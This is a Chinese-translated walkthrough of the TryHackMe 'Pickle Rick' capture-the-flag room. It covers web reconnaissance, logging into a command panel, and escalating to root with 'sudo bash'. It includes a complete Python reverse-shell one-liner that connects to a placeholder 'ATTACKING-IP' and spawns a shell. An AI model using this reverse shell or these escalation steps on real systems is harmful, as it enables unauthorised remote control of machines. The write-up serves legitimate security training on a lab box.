<html>
<head>
<title>Pickle Rick -THM</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">泡菜里克-THM</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/picke-rick-thm-e8fb33d1f259?source=collection_archive---------4-----------------------#2022-12-06">https://infosecwriteups.com/picke-rick-thm-e8fb33d1f259?source=collection_archive---------4-----------------------#2022-12-06</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="94bf" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">侦察:</h2></div><p id="84aa" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">让我们首先在给定的机器上进行nmap扫描，以查看开放的端口。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi lb"><img src="../Images/07b44db103f6a6e3ebbcbe9ca523726f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*er1A-4VF9DphBydDv2NEtg.png"/></div></div></figure><p id="94f5" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">导航到端口80，查看源代码，我们得到用户名:<em class="ln"> R1ckRul3s。</em></p><p id="55e5" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在运行gobuster时，我们可以看到有一个名为assets的目录。让我们去那里。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi lo"><img src="../Images/ba0c2f24f2a7acdffa84e7b99f3d2ab6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1222/format:webp/1*BOn2dyx2MKkD1tAz_T5BVg.png"/></div></figure><p id="67d2" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们也去/robots.txt看看能找到什么</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi lp"><img src="../Images/7aef2e8649c865727365004d944b4a98.png" data-original-src="https://miro.medium.com/v2/resize:fit:1314/format:webp/1*MEmhNHG1-Q9KUtPpIauTEg.png"/></div><figcaption class="lq lr gj gh gi ls lt bd b be z dk translated">Wubbalubbadubdub。无红利</figcaption></figure><p id="97ff" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">Gobuster结果:</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi lu"><img src="../Images/e86ecaf1a8af4a03193ae845c0e8d5c5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xLwwIoYC6L9xdJM0rm3aTQ.png"/></div></div></figure><p id="1ba8" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">让我们尝试使用用户名和作为密码的字符串登录。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi lv"><img src="../Images/5e555ce7c83e401864144795ce81b080.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*feoQ3Fe_ZXPzjINkSlJQ9Q.png"/></div></div></figure><p id="24c5" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们遇到了一个可以执行命令的面板，而“cat”却无法工作！</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi lw"><img src="../Images/8b5b38607fff13f9b2b9527b25b18ce2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*h4fA-6V45FquFgkRPNAfVg.png"/></div></div><figcaption class="lq lr gj gh gi ls lt bd b be z dk translated">所以让我们来欺骗一下，用tac来代替</figcaption></figure><p id="d483" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在clue.txt上使用tac会给出如下输出:</p><pre class="lc ld le lf gt lx ly lz bn ma mb bi"><span id="b0ac" class="mc md iq ly b be me mf l mg mh">Look around the file system for the other ingredient.</span></pre><pre class="mi lx ly lz bn ma mb bi"><span id="4f18" class="mc md iq ly b be me mf l mg mh">tac Sup3rS3cretPickl3Ingred.txt</span></pre><p id="5de6" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">运行这个程序将得到第一个成分作为输出。</p><p id="538b" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在，让我们使用python3脚本获得系统的反向外壳</p><pre class="lc ld le lf gt lx ly lz bn ma mb bi"><span id="c8be" class="mc md iq ly b be me mf l mg mh">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></pre><p id="749a" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">好了，我们有了反向外壳。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi mj"><img src="../Images/3aecbb9c125b9ea9225e354ded10069a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*G2Xcd6uFb5ERY1qEzjV1iw.png"/></div></div></figure><p id="af26" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">使用以下命令使外壳具有交互性</p><pre class="lc ld le lf gt lx ly lz bn ma mb bi"><span id="1dbe" class="mc md iq ly b be me mf l mg mh">/bin/bash -ki</span></pre><p id="a3bd" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在这个shell中获取linpeas.sh文件并运行它，您将看到sudo可以运行任何命令/工具，而不需要密码。或者运行sudo -l来查看权限</p><p id="1fec" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">运行:</p><pre class="lc ld le lf gt lx ly lz bn ma mb bi"><span id="5ece" class="mc md iq ly b be me mf l mg mh">sudo bash</span></pre><p id="b0b0" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">要获得根访问权限，瞧，通过导航到用户主目录来搜索第二个和第三个要素。</p><p id="3f1c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">约翰·哈蒙德有一个很酷的项目，可以更容易地把文件从你的系统转移到机器上。不用设置netcat之类的东西就可以查看这个:<a class="ae mk" href="https://github.com/JohnHammond/poor-mans-pentest/blob/master/upload_file_nc.sh" rel="noopener ugc nofollow" target="_blank">https://github . com/John Hammond/poor-mans-pentest/blob/master/upload _ file _ NC . sh</a>。</p><p id="0c18" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">继续黑！</p></div><div class="ab cl ml mm hu mn" role="separator"><span class="mo bw bk mp mq mr"/><span class="mo bw bk mp mq mr"/><span class="mo bw bk mp mq"/></div><div class="ij ik il im in"><h2 id="195e" class="ms md iq bd mt mu mv dn mw mx my dp mz ko na nb nc ks nd ne nf kw ng nh ni nj bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae mk" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周时事通讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>